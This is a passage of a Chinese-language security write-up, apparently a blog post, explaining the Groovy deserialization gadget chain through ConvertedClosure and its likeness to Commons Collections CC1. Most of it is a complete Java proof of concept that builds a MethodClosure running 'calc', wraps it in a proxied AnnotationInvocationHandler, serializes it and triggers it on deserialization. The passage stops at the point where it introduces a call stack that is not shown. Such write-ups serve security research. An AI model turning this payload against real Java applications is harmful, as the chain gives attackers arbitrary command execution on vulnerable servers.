ConvertedClosureConvertedCloure实际上是一个动态代理类，看名字是一个闭包函数，这个不重要，它继承了ConversionHandler而ConversionHandler又继承了InvocationHandler因此该类是一个动态代理，然后注意invokeCustom,这个和InvocationHandler的invoke是一个意思，代理的具体逻辑。如果初始化时指定的 method 与invokeCustom指定的 method 参数相同，则invokeCustom方法将会调用代理对象 Closure 的 call 方法执行传入参数执行
Groovy反序列化构造既然是动态代理那肯定得走CC1那条路
package org.example;import org.codehaus.groovy.runtime.ConvertedClosure;import org.codehaus.groovy.runtime.MethodClosure;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.Map;/** * Hello world! * */public class App &#123;    public static void main( String[] args ) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;        //封装我们需要执行的对象        MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);        ConvertedClosure closure = new ConvertedClosure(methodClosure, &quot;entrySet&quot;);        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];        constructor.setAccessible(true);        // 创建 ConvertedClosure 的动态代理类实例        Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]&#123;Map.class&#125;, closure);        // 使用动态代理初始化 AnnotationInvocationHandler        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./Groovy&quot;));            outputStream.writeObject(invocationHandler);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./Groovy&quot;));            inputStream.readObject();        &#125;        catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    &#125;
这条链的调用栈如下，和CC1其实是大同小异
